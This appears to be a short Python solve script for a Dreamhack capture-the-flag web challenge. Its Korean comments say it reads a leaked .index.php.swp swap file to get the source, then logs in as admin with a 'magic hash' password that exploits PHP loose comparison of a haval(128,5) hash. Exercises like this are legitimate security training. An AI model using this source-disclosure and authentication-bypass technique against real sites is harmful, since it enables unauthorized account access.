import requests

port = 20054
url_index = f"http://host3.dreamhack.games:{port}/"

# hint에 따라 swp 파일 검색
r = requests.get(url_index + "/.index.php.swp")
print(r.text)

# haval(128, 5) 를 쓰는 것을 알게 됐으니 그 매직 해쉬 검색
param = {"id": "admin", "pw": "115528287"}

r = requests.post(url_index + "/?no=0", data=param)
print(r.text)
